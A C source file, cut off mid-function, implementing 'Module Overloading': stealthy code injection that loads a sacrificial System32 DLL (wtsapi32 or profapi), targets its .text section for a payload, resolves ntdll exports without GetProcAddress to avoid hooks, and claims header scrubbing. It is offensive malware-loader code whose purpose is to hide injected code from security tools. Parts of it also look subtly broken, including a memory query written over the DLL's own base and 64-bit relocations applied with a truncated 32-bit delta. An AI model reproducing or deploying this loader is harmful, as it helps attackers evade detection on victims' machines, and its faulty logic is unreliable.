/*
 * Module Overloading - Implementation
 *
 * Stealthy code injection via sacrificial DLL loading with:
 * - Manual mapping and base relocation
 * - Hookless import address table resolver
 * - Post-mapping header scrubbing
 *
 * Target: Windows 10/11 x64
 * Environment: No-CRT
 */

#include "ModuleOverloading.h"
#include <stdio.h>
#include <intrin.h>
#include <string.h>
#include <stdlib.h>
#include <strsafe.h>

#ifndef RTL_NUMBER_OF
#define RTL_NUMBER_OF(Array) (sizeof(Array) / sizeof((Array)[0]))
#endif

//------------------------------------------------------------------------------
// Global State for Module Overloading
//------------------------------------------------------------------------------

static MODULE_OVERLOADING_CONTEXT G_ModuleOverloadingContext;

typedef struct _API_SET_NAMESPACE {
    ULONG Version;
    ULONG Size;
    ULONG Flags;
    ULONG Count;
    ULONG EntryOffset;
    ULONG HashOffset;
    ULONG HashFactor;
} API_SET_NAMESPACE, *PAPI_SET_NAMESPACE;

typedef struct _API_SET_NAMESPACE_ENTRY {
    ULONG Flags;
    ULONG NameOffset;
    ULONG NameLength;
    ULONG HashedLength;
    ULONG ValueOffset;
    ULONG ValueCount;
} API_SET_NAMESPACE_ENTRY, *PAPI_SET_NAMESPACE_ENTRY;

typedef struct _API_SET_VALUE_ENTRY {
    ULONG Flags;
    ULONG NameOffset;
    ULONG NameLength;
    ULONG ValueOffset;
    ULONG ValueLength;
} API_SET_VALUE_ENTRY, *PAPI_SET_VALUE_ENTRY;

static BOOLEAN ResolveApiSetModuleName(
    IN PCWSTR ModuleName,
    OUT PWSTR ResolvedModuleName,
    IN SIZE_T ResolvedModuleNameCch
);

static PVOID ResolveForwarderExport(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PCHAR ForwarderName
);

static NTSTATUS TryRegisterExceptionTableForImage(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID ImageBase,
    IN SIZE_T ImageSize
);

static ULONGLONG QuerySystemTimeStamp(VOID)
{
    FILETIME FileTime;
    ULARGE_INTEGER TimeValue;

    GetSystemTimeAsFileTime(&FileTime);
    TimeValue.LowPart = FileTime.dwLowDateTime;
    TimeValue.HighPart = FileTime.dwHighDateTime;
    return TimeValue.QuadPart;
}

static BOOLEAN IsImageRangeValid(
    IN ULONG Rva,
    IN SIZE_T Length,
    IN SIZE_T ImageSize
)
{
    if (ImageSize == 0 || Rva >= ImageSize) {
        return FALSE;
    }

    if (Length > (ImageSize - Rva)) {
        return FALSE;
    }

    return TRUE;
}

static BOOLEAN ResolveApiSetModuleName(
    IN PCWSTR ModuleName,
    OUT PWSTR ResolvedModuleName,
    IN SIZE_T ResolvedModuleNameCch
)
{
    PPEB Peb;
    PAPI_SET_NAMESPACE ApiNamespace;
    WCHAR ContractName[MAX_PATH];
    SIZE_T ContractLength;
    SIZE_T SuffixLength;

    if (ModuleName == NULL || ResolvedModuleName == NULL || ResolvedModuleNameCch == 0) {
        return FALSE;
    }

    if (FAILED(StringCchCopyW(ResolvedModuleName, ResolvedModuleNameCch, ModuleName))) {
        return FALSE;
    }

#if defined(_M_X64)
    Peb = (PPEB)__readgsqword(0x60);
#elif defined(_M_IX86)
    Peb = (PPEB)__readfsdword(0x30);
#else
    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
#endif

    if (Peb == NULL || Peb->ApiSetMap == NULL) {
        return FALSE;
    }

    ApiNamespace = (PAPI_SET_NAMESPACE)Peb->ApiSetMap;
    if (ApiNamespace->Count == 0 || ApiNamespace->EntryOffset == 0) {
        return FALSE;
    }

    if (FAILED(StringCchCopyW(ContractName, RTL_NUMBER_OF(ContractName), ModuleName))) {
        return FALSE;
    }

    CharLowerBuffW(ContractName, (DWORD)wcslen(ContractName));
    ContractLength = wcslen(ContractName);
    SuffixLength = wcslen(L".dll");
    if (ContractLength > SuffixLength &&
        _wcsicmp(ContractName + ContractLength - SuffixLength, L".dll") == 0) {
        ContractName[ContractLength - SuffixLength] = L'\0';
        ContractLength -= SuffixLength;
    }

    for (ULONG Index = 0; Index < ApiNamespace->Count; Index++) {
        PAPI_SET_NAMESPACE_ENTRY Entry =
            (PAPI_SET_NAMESPACE_ENTRY)((PUCHAR)ApiNamespace +
                                       ApiNamespace->EntryOffset +
                                       (Index * sizeof(API_SET_NAMESPACE_ENTRY)));
        PAPI_SET_VALUE_ENTRY ValueEntry;
        SIZE_T EntryNameLength;
        PWCHAR EntryName;

        if ((ULONG_PTR)Entry + sizeof(API_SET_NAMESPACE_ENTRY) > (ULONG_PTR)ApiNamespace + ApiNamespace->Size) {
            break;
        }

        EntryNameLength = Entry->NameLength / sizeof(WCHAR);
        if (EntryNameLength != ContractLength || Entry->ValueCount == 0) {
            continue;
        }

        if (Entry->NameOffset + Entry->NameLength > ApiNamespace->Size) {
            continue;
        }

        EntryName = (PWCHAR)((PUCHAR)ApiNamespace + Entry->NameOffset);
        if (_wcsnicmp(EntryName, ContractName, ContractLength) != 0) {
            continue;
        }

        if (Entry->ValueOffset + sizeof(API_SET_VALUE_ENTRY) > ApiNamespace->Size) {
            continue;
        }

        ValueEntry = (PAPI_SET_VALUE_ENTRY)((PUCHAR)ApiNamespace + Entry->ValueOffset);
        if (ValueEntry->ValueLength == 0) {
            continue;
        }

        if (ValueEntry->ValueOffset + ValueEntry->ValueLength > ApiNamespace->Size) {
            continue;
        }

        if (FAILED(StringCchCopyNW(
            ResolvedModuleName,
            ResolvedModuleNameCch,
            (PCWSTR)((PUCHAR)ApiNamespace + ValueEntry->ValueOffset),
            ValueEntry->ValueLength / sizeof(WCHAR)))) {
            return FALSE;
        }

        return TRUE;
    }

    return FALSE;
}

static PVOID ResolveForwarderExport(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PCHAR ForwarderName
)
{
    CHAR ModulePart[MAX_PATH];
    CHAR ProcPart[MAX_PATH];
    CHAR* Delimiter;
    WCHAR ModuleWide[MAX_PATH];
    WCHAR ResolvedModule[MAX_PATH];
    HMODULE TargetModule;
    PVOID TargetAddress;
    SIZE_T ModulePartLength;
    BOOLEAN HasDllSuffix;

    if (Context == NULL || ForwarderName == NULL) {
        return NULL;
    }

    Delimiter = strchr(ForwarderName, '.');
    if (Delimiter == NULL) {
        return NULL;
    }

    if ((SIZE_T)(Delimiter - ForwarderName) >= RTL_NUMBER_OF(ModulePart)) {
        return NULL;
    }

    RtlZeroMemory(ModulePart, sizeof(ModulePart));
    RtlZeroMemory(ProcPart, sizeof(ProcPart));

    memcpy(ModulePart, ForwarderName, (SIZE_T)(Delimiter - ForwarderName));
    if (FAILED(StringCchCopyA(ProcPart, RTL_NUMBER_OF(ProcPart), Delimiter + 1))) {
        return NULL;
    }

    ModulePartLength = strlen(ModulePart);
    HasDllSuffix = FALSE;
    if (ModulePartLength >= 4 &&
        _stricmp(ModulePart + (ModulePartLength - 4), ".dll") == 0) {
        HasDllSuffix = TRUE;
    }

    if (!HasDllSuffix) {
        CHAR ModuleNameWithExt[MAX_PATH];
        if (FAILED(StringCchPrintfA(ModuleNameWithExt, RTL_NUMBER_OF(ModuleNameWithExt), "%s.dll", ModulePart))) {
            return NULL;
        }
        if (FAILED(StringCchCopyA(ModulePart, RTL_NUMBER_OF(ModulePart), ModuleNameWithExt))) {
            return NULL;
        }
    }

    if (MultiByteToWideChar(CP_ACP, 0, ModulePart, -1, ModuleWide, RTL_NUMBER_OF(ModuleWide)) == 0) {
        return NULL;
    }

    if (!ResolveApiSetModuleName(ModuleWide, ResolvedModule, RTL_NUMBER_OF(ResolvedModule))) {
        if (FAILED(StringCchCopyW(ResolvedModule, RTL_NUMBER_OF(ResolvedModule), ModuleWide))) {
            return NULL;
        }
    }

    TargetModule = GetModuleHandleW(ResolvedModule);
    if (TargetModule == NULL) {
        TargetModule = LoadLibraryW(ResolvedModule);
    }
    if (TargetModule == NULL) {
        Context->LastError = STATUS_NOT_FOUND;
        return NULL;
    }

    if (ProcPart[0] == '#') {
        ULONG Ordinal = strtoul(ProcPart + 1, NULL, 10);
        TargetAddress = GetProcAddress(TargetModule, (LPCSTR)(ULONG_PTR)Ordinal);
    }
    else {
        TargetAddress = GetProcAddress(TargetModule, ProcPart);
    }

    if (TargetAddress == NULL) {
        Context->LastError = STATUS_NOT_FOUND;
        return NULL;
    }

    return TargetAddress;
}

static NTSTATUS TryRegisterExceptionTableForImage(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID ImageBase,
    IN SIZE_T ImageSize
)
{
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_DATA_DIRECTORY ExceptionDir;
    PRUNTIME_FUNCTION RuntimeFunctions;
    DWORD RuntimeFunctionCount;

    if (Context == NULL || ImageBase == NULL || ImageSize < sizeof(IMAGE_DOS_HEADER)) {
        return STATUS_INVALID_PARAMETER;
    }

    DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return STATUS_NOT_FOUND;
    }

    if ((SIZE_T)DosHeader->e_lfanew > (ImageSize - sizeof(IMAGE_NT_HEADERS))) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    NtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)ImageBase + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    ExceptionDir = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (ExceptionDir->VirtualAddress == 0 || ExceptionDir->Size < sizeof(RUNTIME_FUNCTION)) {
        return STATUS_NOT_FOUND;
    }

    if (!IsImageRangeValid(ExceptionDir->VirtualAddress, ExceptionDir->Size, ImageSize)) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    RuntimeFunctions = (PRUNTIME_FUNCTION)((PUCHAR)ImageBase + ExceptionDir->VirtualAddress);
    RuntimeFunctionCount = ExceptionDir->Size / sizeof(RUNTIME_FUNCTION);
    if (RuntimeFunctionCount == 0) {
        return STATUS_NOT_FOUND;
    }

    if (Context->RuntimeTableRegistered) {
        RtlDeleteFunctionTable(Context->RuntimeFunctionTable);
        Context->RuntimeFunctionTable = NULL;
        Context->RuntimeFunctionCount = 0;
        Context->RuntimeImageBase = 0;
        Context->RuntimeTableRegistered = FALSE;
    }

    if (!RtlAddFunctionTable(RuntimeFunctions, RuntimeFunctionCount, (DWORD64)ImageBase)) {
        Context->LastError = STATUS_UNSUCCESSFUL;
        return STATUS_UNSUCCESSFUL;
    }

    Context->RuntimeFunctionTable = RuntimeFunctions;
    Context->RuntimeFunctionCount = RuntimeFunctionCount;
    Context->RuntimeImageBase = (DWORD64)ImageBase;
    Context->RuntimeTableRegistered = TRUE;
    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// InitializeModuleOverloading
//
// Initializes the Module Overloading context structure
// with default values and validates memory allocation.
//
// Parameters:
//   Context    - Output pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS InitializeModuleOverloading(
    OUT PMODULE_OVERLOADING_CONTEXT Context
)
{
    if (Context == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Zero out context structure
    RtlZeroMemory(Context, sizeof(MODULE_OVERLOADING_CONTEXT));

    // Set identification tag
    Context->Tag = MODULE_OVERLOADING_TAG;

    // Initialize state
    Context->State = ModuleOverloadingIdle;
    Context->LastError = STATUS_SUCCESS;

    // Initialize default DLL path
    RtlInitUnicodeString(&Context->SacrificialDllPath, SACRIFICIAL_DLL_DEFAULT);

    // Initialize counters
    Context->TotalOperations = 0;
    Context->RelocationsApplied = 0;
    Context->ImportsResolved = 0;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// SelectSacrificialDll
//
// Selects and validates a sacrificial DLL from System32.
// Verifies minimum size requirements and file existence.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   DllPath    - Output pointer to DLL path string
//   DllSize    - Output pointer to DLL size in bytes
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS SelectSacrificialDll(
    OUT PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath,
    OUT PSIZE_T DllSize
)
{
    HANDLE FileHandle;
    LARGE_INTEGER FileSize = { 0 };
    WCHAR System32Path[MAX_PATH];
    WCHAR FullDllPath[MAX_PATH];
    BOOLEAN UseFallback = FALSE;

    if (Context == NULL || DllPath == NULL || DllSize == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Get System32 directory path
    if (GetSystemDirectoryW(System32Path, MAX_PATH) == 0) {
        return STATUS_UNSUCCESSFUL;
    }

    // Build full path for primary sacrificial DLL
    wsprintfW(FullDllPath, L"%s\\wtsapi32.dll", System32Path);
    FileHandle = CreateFileW(
        FullDllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (FileHandle == INVALID_HANDLE_VALUE) {
        // Try fallback DLL
        wsprintfW(FullDllPath, L"%s\\profapi.dll", System32Path);
        FileHandle = CreateFileW(
            FullDllPath,
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        UseFallback = TRUE;
    }

    if (FileHandle == INVALID_HANDLE_VALUE) {
        Context->LastError = STATUS_NOT_FOUND;
        return STATUS_NOT_FOUND;
    }

    // Query file information
    if (!GetFileSizeEx(FileHandle, &FileSize)) {
        CloseHandle(FileHandle);
        Context->LastError = STATUS_UNSUCCESSFUL;
        return STATUS_UNSUCCESSFUL;
    }

    // Validate minimum size requirement
    *DllSize = (SIZE_T)FileSize.QuadPart;

    if (*DllSize < SACRIFICIAL_DLL_MIN_SIZE) {
        CloseHandle(FileHandle);
        Context->LastError = STATUS_BUFFER_TOO_SMALL;
        return STATUS_BUFFER_TOO_SMALL;
    }

    // Store selected DLL name in context.
    RtlInitUnicodeString(
        &Context->SacrificialDllPath,
        UseFallback ? SACRIFICIAL_DLL_FALLBACK : SACRIFICIAL_DLL_DEFAULT
    );
    Context->DllSize = *DllSize;

    CloseHandle(FileHandle);
    Context->State = ModuleOverloadingDllSelected;
    Context->TotalOperations++;

    *DllPath = Context->SacrificialDllPath;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// LoadSacrificialDll
//
// Loads the sacrificial DLL via LoadLibrary to establish a valid
// MEM_IMAGE entry in the VAD tree.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   DllPath    - Pointer to DLL path string
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS LoadSacrificialDll(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath
)
{
    NTSTATUS Status;
    PVOID BaseAddress;
    PDOS_HEADER DosHeader;
    PNT_HEADERS NtHeaders;
    PIMAGE_NT_HEADERS NtHeadersFull;
    PIMAGE_SECTION_HEADER SectionHeader;
    ULONG i;

    if (Context == NULL || DllPath == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Load DLL into address space - creates MEM_IMAGE VAD entry
    BaseAddress = LoadLibraryW(DllPath->Buffer);
    if (BaseAddress == NULL) {
        Context->LastError = (NTSTATUS)GetLastError();
        return STATUS_DLL_INIT_FAILED;
    }

    Context->DllHandle = (HANDLE)BaseAddress;
    Context->DllBaseAddress = BaseAddress;

    // Cache DOS header
    DosHeader = (PDOS_HEADER)BaseAddress;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        FreeLibrary((HMODULE)BaseAddress);
        Context->LastError = STATUS_INVALID_IMAGE_FORMAT;
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    Context->DosHeader = DosHeader;

    // Cache NT headers
    NtHeadersFull = (PIMAGE_NT_HEADERS)((PUCHAR)BaseAddress + DosHeader->e_lfanew);
    if (NtHeadersFull->Signature != IMAGE_NT_SIGNATURE) {
        FreeLibrary((HMODULE)BaseAddress);
        Context->LastError = STATUS_INVALID_IMAGE_FORMAT;
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    // Cast to our NT_HEADERS structure
    NtHeaders = (PNT_HEADERS)&NtHeadersFull->OptionalHeader;
    Context->NtHeaders = NtHeaders;

    // Cache section headers
    SectionHeader = IMAGE_FIRST_SECTION(NtHeadersFull);
    Context->SectionHeaders = SectionHeader;
    Context->NumberOfSections = NtHeadersFull->FileHeader.NumberOfSections;

    // Store image base for relocation calculations
    Context->DllImageBase = NtHeaders->OptionalHeader.ImageBase;

    // Identify .text section for payload injection
    for (i = 0; i < Context->NumberOfSections; i++) {
        if (RtlCompareMemory(SectionHeader[i].Name, ".text", 5) == 5) {
            Context->TextSectionBase = (PVOID)((ULONG_PTR)BaseAddress + SectionHeader[i].VirtualAddress);
            Context->TextSectionSize = SectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    Context->State = ModuleOverloadingDllLoaded;
    Context->TotalOperations++;
    Context->LoadTime = QuerySystemTimeStamp();

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ValidateMemImageEntry
//
// Validates that the DLL has established a valid MEM_IMAGE entry
// in the VAD tree by checking memory protection attributes.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   TRUE if MEM_IMAGE entry is valid, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN ValidateMemImageEntry(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PMEMORY_BASIC_INFORMATION MemoryInfo;
    SIZE_T QueryResult;
    ULONG ExpectedProtection;

    if (Context == NULL || Context->DllBaseAddress == NULL) {
        return FALSE;
    }

    MemoryInfo = (PMEMORY_BASIC_INFORMATION)Context->DllBaseAddress;
    QueryResult = VirtualQuery(
        Context->DllBaseAddress,
        MemoryInfo,
        sizeof(MEMORY_BASIC_INFORMATION)
    );

    if (QueryResult == 0) {
        return FALSE;
    }

    // Verify MEM_IMAGE allocation type
    if ((MemoryInfo->State & MEM_COMMIT) == 0 ||
        (MemoryInfo->State & MEM_RESERVE) == 0) {
        return FALSE;
    }

    // Verify executable protection (PAGE_EXECUTE_READ or PAGE_EXECUTE_READWRITE)
    ExpectedProtection = MemoryInfo->Protect;
    if (ExpectedProtection != PAGE_EXECUTE_READ &&
        ExpectedProtection != PAGE_EXECUTE_READWRITE &&
        ExpectedProtection != PAGE_EXECUTE) {
        return FALSE;
    }

    Context->TotalOperations++;
    return TRUE;
}

//------------------------------------------------------------------------------
// ParseBaseRelocationTable
//
// Parses the PE Base Relocation Table to identify all
// relocation blocks and their contents.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   RelocationCount - Output pointer to total relocation count
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ParseBaseRelocationTable(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    OUT PULONG RelocationCount
)
{
    PIMAGE_DATA_DIRECTORY RelocationDir;
    PIMAGE_BASE_RELOCATION RelocationBlock;
    PIMAGE_RELOCANT Relocant;
    ULONG HeaderIndex;
    ULONG BlockCount;
    ULONG TotalRelocations;
    PUCHAR RelocationBase;

    if (Context == NULL || RelocationCount == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    *RelocationCount = 0;

    // Get relocation directory from OptionalHeader
    RelocationDir = &Context->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (RelocationDir->VirtualAddress == 0 || RelocationDir->Size == 0) {
        Context->LastError = STATUS_NOT_FOUND;
        return STATUS_NOT_FOUND;
    }

    Context->RelocationTableRva = RelocationDir->VirtualAddress;
    Context->RelocationTableSize = RelocationDir->Size;
    RelocationBase = (PUCHAR)Context->DllBaseAddress + RelocationDir->VirtualAddress;

    // Parse relocation blocks
    TotalRelocations = 0;
    HeaderIndex = 0;

    while (HeaderIndex < RelocationDir->Size) {
        RelocationBlock = (PIMAGE_BASE_RELOCATION)(RelocationBase + HeaderIndex);

        // Validate relocation block
        if (!ValidateRelocationBlock(
            (PRELOCATION_BLOCK)RelocationBlock,
            RelocationBlock->SizeOfBlock
        )) {
            Context->LastError = STATUS_INVALID_PARAMETER;
            return STATUS_INVALID_PARAMETER;
        }

        // Process relocants in this block
        if (RelocationBlock->SizeOfBlock > sizeof(IMAGE_BASE_RELOCATION)) {
            BlockCount = (RelocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                          sizeof(IMAGE_RELOCANT);

            for (ULONG i = 0; i < BlockCount; i++) {
                Relocant = &((PIMAGE_RELOCANT)((PUCHAR)RelocationBlock + sizeof(IMAGE_BASE_RELOCATION)))[i];
                // Count valid relocations
                if ((Relocant->Type & 0xFFF) != 0) {
                    TotalRelocations++;
                }
            }
        }

        HeaderIndex += RelocationBlock->SizeOfBlock;
    }

    Context->RelocationsApplied = TotalRelocations;
    *RelocationCount = TotalRelocations;
    Context->State = ModuleOverloadingRelocationApplied;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ValidateRelocationBlock
//
// Validates a relocation block structure and its integrity.
//
// Parameters:
//   Block    - Pointer to relocation block
//   BlockSize - Size of the block in bytes
//
// Returns:
//   TRUE if valid, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN ValidateRelocationBlock(
    IN PRELOCATION_BLOCK Block,
    IN ULONG BlockSize
)
{
    if (Block == NULL) {
        return FALSE;
    }

    // Minimum block size check
    if (BlockSize < sizeof(IMAGE_BASE_RELOCATION)) {
        return FALSE;
    }

    // Virtual address alignment check (must be page-aligned)
    if ((Block->VirtualAddress & 0xFFF) != 0) {
        return FALSE;
    }

    return TRUE;
}

//------------------------------------------------------------------------------
// ApplyBaseRelocations
//
// Applies base relocations to the loaded module based on
// the difference between image base and actual load address.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   Delta      - Difference between actual and preferred base address
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ApplyBaseRelocations(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONGLONG Delta
)
{
    PIMAGE_DATA_DIRECTORY RelocationDir;
    PIMAGE_BASE_RELOCATION RelocationBlock;
    PIMAGE_RELOCANT Relocant;
    ULONG HeaderIndex;
    PUCHAR RelocationBase;
    PULONG TargetAddress;
    USHORT RelocationType;

    if (Context == NULL || Delta == 0) {
        return STATUS_SUCCESS;
    }

    // Get relocation directory
    RelocationDir = &Context->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    RelocationBase = (PUCHAR)Context->DllBaseAddress + RelocationDir->VirtualAddress;
    HeaderIndex = 0;

    // Process each relocation block
    while (HeaderIndex < RelocationDir->Size) {
        RelocationBlock = (PIMAGE_BASE_RELOCATION)(RelocationBase + HeaderIndex);

        // Calculate number of relocants in this block
        if (RelocationBlock->SizeOfBlock > sizeof(IMAGE_BASE_RELOCATION)) {
            ULONG RelocantCount = (RelocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                                   sizeof(IMAGE_RELOCANT);
            PIMAGE_RELOCANT RelocantArray = (PIMAGE_RELOCANT)((PUCHAR)RelocationBlock + sizeof(IMAGE_BASE_RELOCATION));

            for (ULONG i = 0; i < RelocantCount; i++) {
                Relocant = &RelocantArray[i];
                RelocationType = (Relocant->Type & 0xFFF);

                // Calculate target address
                TargetAddress = (PULONG)((ULONG_PTR)Context->DllBaseAddress +
                                         RelocationBlock->VirtualAddress +
                                         (Relocant->Offset & 0xFFF));

                // Apply relocation based on type
                switch (RelocationType) {
                case IMAGE_REL_BASED_DIR64:
                    *TargetAddress += (ULONG)Delta;
                    break;

                case IMAGE_REL_BASED_HIGH:
                    *TargetAddress += (ULONG)(Delta >> 16);
                    break;

                case IMAGE_REL_BASED_LOW:
                    *TargetAddress += (ULONG)(Delta & 0xFFFF);
                    break;

                case IMAGE_REL_BASED_HIGHADJ:
                    // High adjustment for DIR64
                    *TargetAddress += (ULONG)(Delta >> 16);
                    break;

                default:
                    break;
                }

                Context->RelocationsApplied++;
            }
        }

        HeaderIndex += RelocationBlock->SizeOfBlock;
    }

    Context->TotalOperations++;
    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// InitializeNtdllExportDirectory
//
// Initializes the ntdll.dll export directory for hookless
// import resolution by loading and parsing the module.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS InitializeNtdllExportDirectory(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    HANDLE NtdllHandle;
    PVOID NtdllBase;
    PDOS_HEADER NtdllDosHeader;
    PIMAGE_NT_HEADERS NtdllNtHeaders;
    PIMAGE_DATA_DIRECTORY ExportDirEntry;
    PEXPORT_DIRECTORY ExportDirectory;
    WCHAR NtdllPath[MAX_PATH];

    if (Context == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Build ntdll.dll path
    GetSystemDirectoryW(NtdllPath, MAX_PATH);
    wcscat_s(NtdllPath, MAX_PATH, L"\\ntdll.dll");

    // Load ntdll.dll
    NtdllHandle = LoadLibraryW(NtdllPath);
    if (NtdllHandle == NULL) {
        Context->LastError = (NTSTATUS)GetLastError();
        return STATUS_DLL_INIT_FAILED;
    }

    NtdllBase = NtdllHandle;
    Context->NtdllBaseAddress = NtdllBase;

    // Parse DOS and NT headers
    NtdllDosHeader = (PDOS_HEADER)NtdllBase;
    if (NtdllDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        FreeLibrary((HMODULE)NtdllBase);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    NtdllNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)NtdllBase + NtdllDosHeader->e_lfanew);
    if (NtdllNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        FreeLibrary((HMODULE)NtdllBase);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    // Get export directory entry
    ExportDirEntry = &NtdllNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (ExportDirEntry->VirtualAddress == 0) {
        FreeLibrary((HMODULE)NtdllBase);
        return STATUS_NOT_FOUND;
    }

    // Cache export directory
    ExportDirectory = (PEXPORT_DIRECTORY)((PUCHAR)NtdllBase + ExportDirEntry->VirtualAddress);
    Context->NtdllExportDirectory = ExportDirectory;
    Context->NtdllImageSize = NtdllNtHeaders->OptionalHeader.SizeOfImage;
    Context->NtdllExportRva = ExportDirEntry->VirtualAddress;
    Context->NtdllExportSize = ExportDirEntry->Size;

    Context->State = ModuleOverloadingImportsResolved;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ResolveExportByName
//
// Manually resolves an export function by name by walking
// the Export Directory without using GetProcAddress.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   FunctionName - Name of the function to resolve
//
// Returns:
//   Function address on success, NULL otherwise
//------------------------------------------------------------------------------

PVOID ResolveExportByName(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PCHAR FunctionName
)
{
    PEXPORT_DIRECTORY ExportDir;
    PULONG Functions;
    ULONG FunctionIndex;
    ULONG ExportTargetRva;
    PVOID FunctionAddress;

    if (Context == NULL || FunctionName == NULL || Context->NtdllExportDirectory == NULL) {
        return NULL;
    }

    ExportDir = Context->NtdllExportDirectory;

    // Walk export directory to find function
    if (!WalkExportDirectory(
        ExportDir,
        Context->NtdllBaseAddress,
        Context->NtdllImageSize,
        FunctionName,
        &FunctionIndex
    )) {
        Context->LastError = STATUS_NOT_FOUND;
        return NULL;
    }

    // Calculate function address
    Functions = (PULONG)((PUCHAR)Context->NtdllBaseAddress + ExportDir->AddressOfFunctions);
    ExportTargetRva = Functions[FunctionIndex];

    if (IsImageRangeValid(ExportTargetRva, sizeof(CHAR), Context->NtdllImageSize) &&
        ExportTargetRva >= Context->NtdllExportRva &&
        ExportTargetRva < (Context->NtdllExportRva + Context->NtdllExportSize)) {
        FunctionAddress = ResolveForwarderExport(
            Context,
            (PCHAR)((PUCHAR)Context->NtdllBaseAddress + ExportTargetRva)
        );
        if (FunctionAddress == NULL) {
            return NULL;
        }
    }
    else {
        FunctionAddress = (PVOID)((PUCHAR)Context->NtdllBaseAddress + ExportTargetRva);
    }

    // Cache resolved function
    if (Context->ResolvedFunctionCount < 256) {
        Context->ResolvedFunctions[Context->ResolvedFunctionCount] = (ULONG_PTR)FunctionAddress;
        Context->ResolvedFunctionCount++;
        Context->ImportsResolved++;
    }

    Context->TotalOperations++;
    return FunctionAddress;
}

//------------------------------------------------------------------------------
// ResolveExportByOrdinal
//
// Manually resolves an export function by ordinal value.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   FunctionOrdinal - Ordinal value of the function
//
// Returns:
//   Function address on success, NULL otherwise
//------------------------------------------------------------------------------

PVOID ResolveExportByOrdinal(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONG FunctionOrdinal
)
{
    PEXPORT_DIRECTORY ExportDir;
    PULONG Functions;
    PVOID FunctionAddress;
    ULONG ExportTargetRva;

    if (Context == NULL || Context->NtdllExportDirectory == NULL) {
        return NULL;
    }

    ExportDir = Context->NtdllExportDirectory;

    // Adjust ordinal by base
    ULONG AdjustedOrdinal = FunctionOrdinal - ExportDir->Base;

    if (AdjustedOrdinal >= ExportDir->NumberOfFunctions) {
